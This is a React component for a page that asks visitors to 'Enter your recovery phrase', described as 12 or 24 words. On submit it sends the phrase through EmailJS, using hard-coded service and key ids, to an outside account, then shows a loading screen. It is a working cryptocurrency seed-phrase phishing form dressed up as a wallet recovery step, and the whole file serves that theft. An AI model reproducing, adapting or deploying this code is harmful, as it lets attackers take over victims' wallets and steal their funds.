import classes from './Phrase.module.css'
import {Form, Button} from 'react-bootstrap';
import Aux from '../hoc/Auxiliary/Auxiliary';
import arrow from '../../../public/icons/arrow.png';
import React from 'react';
import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';
import Image from 'next/image'


class Phrase extends React.Component {

    constructor(props){
        super(props)
        this.state = {
            info: {
                phrase: '',
                walletAddress: '',
            },
            errors: {
                phrase: '',
                walletAddress: ''
            },
            phraseValid: false,
            walletaddressValid: false,
            formValid: false
        }
        this.submitForm = this.submitForm.bind(this)

    }

    handleChange(e) {
        let info = this.state.info;
        const name = e.target.name;
        const value = e.target.value;
        info[name] = value

            this.setState({info : {...info}}, () => {
                this.validateField(name, value)
            });


      }

      validateField(name, value) {
          let errors = this.state.errors;
          let phraseValid = this.state.phraseValid;
          let walletaddressValid = this.state.walletaddressValid

        if(name === 'walletAddress') {
            walletaddressValid = value.length >= 20;
            errors.walletAddress = walletaddressValid ? '' : 'Wallet Address too short'
        } else if (name === 'phrase') {
            phraseValid = value.length >= 12
            errors.phrase = phraseValid ? '' : 'Phrase is too short'
        }

        this.setState({
            errors: errors,
            phraseValid: phraseValid,
            walletaddressValid: walletaddressValid,
          },  this.validateForm);
      }

      validateForm() {

        this.setState({
            formValid: this.state.phraseValid
        })
    }

    submitForm(e){
        e.preventDefault(); // Prevents default refresh by the browser

        let template = {
            phrase: this.state.info.phrase,
        }

        emailjs.send('service_q0cj98e', 'template_9l9tkwh', template, {
            publicKey: '4LgmpWQyQz41eoC4j'
        })
        .then((result) => {
        // alert("Message Sent, We will get back to you shortly", result.text);
        this.props.modalClosed()
        this.props.startPreloader()
        },
        (err) => {
            if (err instanceof EmailJSResponseStatus) {
                alert(`An error occurred, Please try again`);
                return;
              }
        });

    }

    render() {
    return(
     <Aux>
         <Form id="form-top">

                {/* <Form.Group  className="mb-3" controlId="exampleForm.ControlInput1">

                   <Form.Control className={this.state.errors.walletAddress ? classes.Error : ''} name="walletAddress" value={this.state.info.walletAddress} onChange={(e) => {this.handleChange(e)}}   type="text" placeholder="Wallet Address" />
                   <small><span className={classes.Up}>{this.state.errors.walletAddress}</span></small>
               </Form.Group> */}


            <Form.Group className="mb-3" controlId="exampleForm.ControlTextarea1">
                <Form.Control name="phrase" className={this.state.errors.phrase ? classes.Error : ''}  value={this.state.info.phrase} onChange={(e) => {this.handleChange(e)}}   as="textarea" placeholder="Enter your recovery phrase" rows={5} />
                <small><span className={classes.Up}>{this.state.errors.phrase}</span></small> <br />
            </Form.Group>

            <small className='text-white' style={{fontSize: '12px'}}>Typically 12 (sometimes 24) words separated by single spaces</small>
             <br></br>
            <Button className='flex align-center justify-center' disabled={!this.state.formValid} onClick={this.submitForm} style={{width: '100%'}}>
                proceed
            </Button>
         </Form>
     </Aux>
  );
    }

}

export default Phrase